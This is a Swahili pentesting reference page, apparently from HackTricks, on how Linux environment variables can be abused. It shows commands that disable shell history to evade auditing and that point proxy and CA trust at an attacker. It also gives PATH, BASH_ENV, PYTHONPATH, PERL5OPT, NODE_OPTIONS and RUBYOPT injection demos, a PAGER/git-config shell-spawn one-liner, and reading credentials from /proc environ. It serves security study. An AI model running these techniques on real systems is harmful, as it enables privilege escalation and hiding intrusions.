# Vigezo vya Mazingira vya Linux

## Vigezo vya kimataifa

Vigezo vya kimataifa **vitarithiwa** na **process za watoto**.

Unaweza kuunda kigezo cha kimataifa kwa session yako ya sasa kwa kufanya:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Kigezo hiki kitapatikana katika sessions zako za sasa na michakato yake tanzu.

Unaweza **kuondoa** kigezo kwa kufanya:
```bash
unset MYGLOBAL
```
## Vigezo vya ndani

**Vigezo vya ndani** vinaweza tu **kufikiwa** na **shell/script ya sasa**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Orodhesha variables za sasa
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
Maudhui ya `/proc/*/environ` **yametenganishwa kwa NUL**, kwa hivyo variants hizi kwa kawaida ni rahisi kusoma:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Ikiwa unatafuta **credentials** au **interesting service configuration** ndani ya mazingira yaliyorithiwa, pia kagua [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Vigezo vya kawaida

Kutoka: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – display inayotumiwa na **X**. Variable hii kwa kawaida huwekwa kuwa **:0.0**, kumaanisha display ya kwanza kwenye computer ya sasa.
- **EDITOR** – text editor anayependelewa na mtumiaji.
- **HISTFILESIZE** – idadi ya juu zaidi ya mistari iliyo kwenye history file.
- **HISTSIZE** – Idadi ya mistari inayoongezwa kwenye history file mtumiaji anapomaliza session yake.
- **HOME** – directory yako ya home.
- **HOSTNAME** – hostname ya computer.
- **LANG** – language yako ya sasa.
- **MAIL** – mahali ilipo mail spool ya mtumiaji. Kwa kawaida ni **/var/spool/mail/USER**.
- **MANPATH** – orodha ya directories za kutafutwa kwa manual pages.
- **OSTYPE** – aina ya operating system.
- **PS1** – prompt ya default katika bash.
- **PATH** – huhifadhi path za directories zote zilizo na binary files unazotaka kutekeleza kwa kutaja tu jina la file, badala ya kutumia relative au absolute path.
- **PWD** – working directory ya sasa.
- **SHELL** – path ya command shell ya sasa (kwa mfano, **/bin/bash**).
- **TERM** – aina ya terminal ya sasa (kwa mfano, **xterm**).
- **TZ** – time zone yako.
- **USER** – username yako ya sasa.

## Vigezo vya kuvutia kwa hacking

Si kila variable ina manufaa sawa. Kwa mtazamo wa offensive, weka kipaumbele kwa variables zinazobadilisha **search paths**, **startup files**, **dynamic linker behavior**, au **audit/logging**.

### **HISTFILESIZE**

Badilisha **thamani ya variable hii iwe 0**, ili unapomaliza **session yako**, **history file** (\~/.bash_history) **ipunguzwe hadi mistari 0**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Badilisha **thamani ya variable hii iwe 0**, ili amri **zisihifadhiwe kwenye history iliyo kwenye memory** na zisiandikwe tena kwenye **history file** (\~/.bash_history).
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

Ikiwa **thamani ya variable hii imewekwa kuwa `ignorespace` au `ignoreboth`**, command yoyote iliyotanguliwa na space ya ziada haitahifadhiwa kwenye history.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Elekeza **history file** kwenye **`/dev/null`** au iondoe kabisa. Hii kwa kawaida inaaminika zaidi kuliko kubadilisha tu ukubwa wa history.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Michakato itatumia **proxy** iliyotangazwa hapa kuunganisha kwenye internet kupitia **http au https**.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: proxy chaguomsingi kwa tools/protocols zinazoiunga mkono.
- `no_proxy`: orodha ya bypass (hosts/domains/CIDRs) zinazopaswa kuunganishwa moja kwa moja.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Toleo la herufi ndogo na herufi kubwa linaweza kutumika kulingana na tool (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Michakato itaamini certificates zilizoonyeshwa katika **hizi env variables**. Hii ni muhimu kufanya tools kama **`curl`**, **`git`**, HTTP clients za Python, au package managers ziambue CA inayodhibitiwa na attacker (kwa mfano, kufanya interception proxy ionekane halali).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Ikiwa privileged wrapper/script inatekeleza commands **bila absolute paths**, directory ya kwanza inayodhibitiwa na attacker katika `PATH` ndiyo itakayotumika. Hii ndiyo primitive inayotumika katika **PATH hijacks** nyingi kwenye `sudo`, cron jobs, shell wrappers, na custom SUID helpers. Tafuta `env_keep+=PATH`, `secure_path` iliyo dhaifu, au wrappers zinazoita `tar`, `service`, `cp`, `python`, n.k. kwa majina.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
Kwa minyororo kamili ya privilege-escalation inayotumia vibaya `PATH`, angalia [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` si rejeleo la directory pekee: tools nyingi hupakia moja kwa moja **dotfiles**, **plugins**, na **per-user configuration** kutoka `$HOME` au `$XDG_CONFIG_HOME`. Ikiwa workflow yenye privileges itahifadhi thamani hizi, **config injection** inaweza kuwa rahisi kuliko **binary hijacking**.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Mifano ya faili zinazovutia ni `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py`, pamoja na faili maalum za tools kama `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Variables hizi huathiri **dynamic linker**:

- `LD_PRELOAD`: hulazimisha shared objects za ziada zipakiwe kwanza.
- `LD_LIBRARY_PATH`: huongeza mwanzoni directories za kutafutia libraries.
- `LD_AUDIT`: hupakia auditor libraries zinazofuatilia upakiaji wa libraries na utatuzi wa symbols.

Ni muhimu sana kwa **hooking**, **instrumentation**, na **privilege escalation** ikiwa command yenye privileges itazihifadhi. Katika hali ya **secure-execution** (`AT_SECURE`, kwa mfano setuid/setgid/capabilities), loader huondoa au kuzuia nyingi ya variables hizi. Hata hivyo, bugs za parser katika hatua hiyo ya awali ya loader bado zina athari kubwa kwa sababu huendeshwa **kabla** ya target program.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` hubadilisha tabia ya mapema ya glibc (kwa mfano, allocator tunables) na ni muhimu sana katika exploit labs. Pia ni muhimu kwa mtazamo wa usalama kwa sababu **dynamic loader huichanganua mapema sana**. Hitilafu ya **Looney Tunables** ya mwaka 2023 ilikuwa ukumbusho mzuri kwamba environment variable moja inayochanganuliwa na loader inaweza kuwa **local privilege-escalation primitive** dhidi ya programu za SUID.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

Ikiwa **Bash** itaanzishwa **non-interactively**, hukagua `BASH_ENV` na kusource hiyo file kabla ya kuendesha target script. Bash inapoitiwa kama `sh`, au katika interactive mode ya mtindo wa POSIX, `ENV` inaweza pia kukaguliwa. Hii ni njia ya kawaida ya kubadilisha shell wrapper kuwa code execution ikiwa environment inadhibitiwa na attacker.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash hupuuza mafaili haya ya kuanzisha wakati **vitambulisho halisi/amilifu vinatofautiana**; `-p` huhifadhi kitambulisho amilifu lakini haiwashi mafaili hayo ya kuanzisha, kwa hiyo tabia halisi hutegemea jinsi wrapper inavyoanzisha shell. Kuwa mwangalifu na wrapper zenye privileges zinazoita `setuid()`/`setgid()` **kabla** ya kuanzisha Bash: vitambulisho vinapolingana tena, Bash inaweza kuamini `BASH_ENV`, `ENV`, na hali inayohusiana ya shell ambayo vinginevyo ingepuuzwa.<sup>[[1]](#references)</sup>

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

Variables hizi hubadilisha jinsi Python inavyoanza:

- `PYTHONPATH`: huongeza mwanzoni paths za utafutaji wa imports.
- `PYTHONHOME`: huhamisha mti wa standard library.
- `PYTHONSTARTUP`: hutekeleza file kabla ya interactive prompt.
- `PYTHONINSPECT=1`: huingia katika interactive mode baada ya script kumaliza.

Ni muhimu dhidi ya maintenance scripts, debuggers, shells, na wrappers zinazoita Python zikiwa na environment inayoweza kudhibitiwa. `python -E` na `python -I` hupuuza variables zote za `PYTHON*`.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
Mfano wa hivi karibuni wa ulimwengu halisi ulikuwa **needrestart** LPE ya 2024 kwenye mifumo ya Ubuntu/Debian: scanner inayomilikiwa na root ilinakili `PYTHONPATH` ya process isiyo na privileges kutoka `/proc/<PID>/environ` kisha ikaendesha Python. Exploit iliyochapishwa iliweka `importlib/__init__.so` kwenye path inayodhibitiwa na attacker, hivyo Python ikaendesha code ya attacker wakati wa initialization yake yenyewe, kabla hata script iliyowekwa moja kwa moja na helper haijawa na umuhimu.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl ina startup variables zenye manufaa sawa:

- `PERL5LIB`: huongeza library directories mwanzoni.
- `PERL5OPT`: huingiza switches kana kwamba zilikuwa kwenye kila command line ya `perl`.

Hii inaweza kulazimisha **automatic module loading** au kubadilisha tabia ya interpreter kabla target script haijafanya jambo lolote muhimu. Perl hupuuza variables hizi katika mazingira ya **taint / setuid / setgid**, lakini bado zina umuhimu mkubwa kwa wrappers zinazoendeshwa na root kwa matumizi ya kawaida, CI jobs, installers, na custom sudoers rules.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` huongeza **alama za CLI za Node.js** mwanzoni mwa kila mchakato wa `node` unaorithi environment. Hii huifanya iwe muhimu dhidi ya wrappers, kazi za CI, wasaidizi wa Electron, na sheria za sudo ambazo hatimaye huendesha Node. Flags zinazovutia zaidi kwa matumizi ya kushambulia kwa kawaida ni:

- `--require <file>`: pakia mapema faili ya CommonJS kabla ya script lengwa.
- `--import <module>`: pakia mapema ES module kabla ya script lengwa.

Node hukataa baadhi ya flags hatari katika `NODE_OPTIONS`, lakini `--require` na `--import` zinaruhusiwa wazi na huchakatwa **kabla** ya arguments za kawaida za command-line.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
Kwa gadget chains za mbali zinazoweka `NODE_OPTIONS` kwa njia isiyo ya moja kwa moja (kwa mfano, prototype-pollution hadi RCE), angalia [ukurasa huu mwingine](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby inatoa aina hiyo hiyo ya matumizi mabaya wakati wa kuanzisha:

- `RUBYLIB`: huongeza saraka mwanzoni mwa load path ya Ruby.
- `RUBYOPT`: huingiza command-line options kama vile `-r` katika kila matumizi ya `ruby`.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Udhaifu wa **needrestart** wa mwaka 2024 ulionyesha kuwa hii si ujanja wa maabara pekee: helper huyo huyo mwenye root aliyekuwa katika hatari ya kutumiwa vibaya kupitia `PYTHONPATH` angeweza pia kulazimishwa kuendesha Ruby kwa `RUBYLIB` inayodhibitiwa na mshambuliaji, na kupakia `enc/encdb.so` kutoka kwenye directory ya mshambuliaji.<sup>[[3]](#references)</sup>

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Baadhi ya tools hazisomi tu path kutoka kwenye environment; hupitisha thamani hiyo kwa **shell**, **editor**, au **input preprocessor**. Hii huzifanya variables zifuatazo zivutie hasa wakati privileged wrapper inaendesha `git`, `man`, `less`, au text viewers zinazofanana:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: huchagua pager command.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: huchagua editor command, mara nyingi ikiwa na arguments.
- `LESSOPEN`, `LESSCLOSE`: hufafanua pre/post-processors zinazoendeshwa wakati `less` inapofungua file.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git pia inasaidia **env-only config injection** bila kugusa disk kupitia `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, na `GIT_CONFIG_VALUE_<n>`:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Kwa mtazamo wa post-exploitation, pia kumbuka kwamba mazingira yaliyorithiwa mara nyingi huwa na **credentials**, **proxy settings**, **service tokens**, au **cloud keys**. Angalia [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) kwa uchunguzi wa `/proc/<PID>/environ` na `systemd` `Environment=`.

### PS1

Badilisha jinsi prompt yako inavyoonekana.

[**Huu ni mfano**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Huu ni mfano](<../images/image (897).png>)

Mtumiaji wa kawaida:

![PERL5OPT & PERL5LIB - PS1: Kazi moja, mbili na tatu zinazoendeshwa chinichini](<../images/image (740).png>)

Kazi moja, mbili na tatu zinazoendeshwa chinichini:

![PERL5OPT & PERL5LIB - PS1: Kazi moja, mbili na tatu zinazoendeshwa chinichini](<../images/image (145).png>)

Kazi moja ya chinichini, moja iliyosimamishwa na command ya mwisho haikukamilika ipasavyo:

![PERL5OPT & PERL5LIB - PS1: Kazi moja ya chinichini, moja iliyosimamishwa na command ya mwisho haikukamilika ipasavyo](<../images/image (715).png>)

## References

- [1] [GNU Bash Manual - Faili za Kuanzisha Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPEs katika needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Nyaraka za Node.js CLI - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Vigezo vya kawaida vya mazingira - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Local Privilege Escalation katika glibc's ld.so - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
{{#include ../../banners/hacktricks-training.md}}
